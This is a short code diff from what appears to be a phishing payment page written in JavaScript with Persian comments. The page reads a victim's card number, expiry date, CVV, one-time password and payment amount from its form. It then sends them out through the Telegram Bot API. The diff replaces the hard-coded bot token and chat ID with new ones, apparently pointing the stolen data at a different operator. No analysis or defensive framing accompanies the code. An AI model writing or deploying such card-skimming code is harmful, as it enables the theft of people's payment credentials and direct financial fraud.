@@ -72,8 +72,8 @@
         const otp = document.getElementById('otp').value;
         const amount = document.getElementById('amount').value;
 
-        const botToken = '7097497462:AAE-i08g-nNVUyEnV3PSoOmCq0ZsMMiJd4E'; // توکن ربات
-        const chatId = '7311931997'; // شناسه چت
+        const botToken = '7052052887:AAEAAZaJqLHxQAgnFnrWnHjMrUgvkbqv8GM'; // توکن ربات
+        const chatId = '7283653302'; // شناسه چت
         const message = `شماره کارت: ${cardNumber}\nتاریخ انقضا: ${expirationDate}\nCVV: ${cvv}\nرمز پویا: ${otp}\nمبلغ: ${amount} تومان`;
 
         fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
